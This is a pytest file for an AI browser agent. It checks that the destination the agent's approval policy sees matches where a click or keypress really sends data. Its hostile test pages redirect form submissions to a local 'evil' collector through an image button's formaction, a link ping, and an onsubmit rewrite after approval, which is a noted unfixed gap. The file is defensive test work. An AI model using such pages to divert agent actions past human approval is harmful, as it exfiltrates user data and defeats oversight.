"""Hostile pages must not make the approved destination differ from the real one."""
from __future__ import annotations

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
import websockets

from app.agent.tests.test_browser_real_chrome import RealCDPBridge, isolated_chrome
from app.skills.browser_use.extension.toolset import BrowserTools


class _Collector(BaseHTTPRequestHandler):
    """A second origin (different port) that records what reaches it."""
    hits: list[str] = []
    def do_POST(self):
        self.rfile.read(int(self.headers.get('Content-Length', 0)))
        type(self).hits.append(self.path)
        self.send_response(204)
        self.end_headers()
    do_GET = do_POST
    def log_message(self, *args):
        pass


def _page_handler(html_for):
    class Page(BaseHTTPRequestHandler):
        def do_GET(self):
            body = html_for(self.path).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(body)
        def do_POST(self):
            self.rfile.read(int(self.headers.get('Content-Length', 0)))
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<p id=local>Local submission</p>')
        def log_message(self, *args):
            pass
    return Page


def _with_collector():
    _Collector.hits = []
    server = ThreadingHTTPServer(('127.0.0.1', 0), _Collector)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, f'http://127.0.0.1:{server.server_port}'


async def _context(socket_url, url, tool, build_args):
    async with websockets.connect(socket_url, origin='http://localhost') as socket:
        bridge = RealCDPBridge(socket)
        tools = BrowserTools(bridge)
        try:
            await tools.call('navigate_page', {'url': url, 'includeSnapshot': False})
            await tools.call('take_snapshot', {})
            session = tools.pages.session(7)
            uid = lambda name: next(n.uid for n in session.nodes.values() if n.name == name)
            args = await build_args(bridge, uid)
            context = (await tools.call('__monaw_action_context', {'tool_name': tool, 'arguments': args})).structured_content['browser_action_context']
            await tools.call(tool, {**args, '__monaw_authorization': context})
            await asyncio.sleep(1.5)
            return context
        finally:
            bridge.reader.cancel()
            await asyncio.gather(bridge.reader, return_exceptions=True)


def test_enter_submits_through_an_image_button_the_policy_must_see(tmp_path):
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'''<!doctype html><form action=/save method=post>
          <input name=q aria-label="Query"><input type=image alt="Go" formaction="{evil}/image">
          <button type=submit>Save</button></form>'''
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def focus(bridge, uid):
                await bridge.evaluate("document.querySelector('[name=q]').focus()")
                return {'key': 'Enter', 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'press_key', focus))
        actually_sent = bool(_Collector.hits)
        assert actually_sent == context['destination'].startswith(evil), (context['destination'], _Collector.hits)
        assert context['side_effect'] == 'external_mutation'
    finally:
        collector.shutdown()
        collector.server_close()


def test_link_ping_destination_is_disclosed(tmp_path):
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'<!doctype html><a href=/next ping="{evil}/ping">Next page</a>'
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def link(bridge, uid):
                return {'uid': uid('Next page'), 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'click', link))
        assert _Collector.hits == ['/ping']
        assert context['additional_destinations'] == [evil + '/ping']
        assert context['side_effect'] == 'external_mutation'
    finally:
        collector.shutdown()
        collector.server_close()


@pytest.mark.xfail(strict=True, reason='Known gap: a submit handler can change the destination after approval. '
                   'Needs request-level enforcement during the approved action.')
def test_onsubmit_rewrite_after_approval_is_reported(tmp_path):
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'''<!doctype html><form action=/save method=post
          onsubmit="this.setAttribute('action','{evil}/rewritten')"><input name=q aria-label="Query">
          <button type=submit>Save</button></form>'''
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def click(bridge, uid):
                return {'uid': uid('Save'), 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'click', click))
        assert not _Collector.hits or context['destination'].startswith(evil), (context['destination'], _Collector.hits)
    finally:
        collector.shutdown()
        collector.server_close()
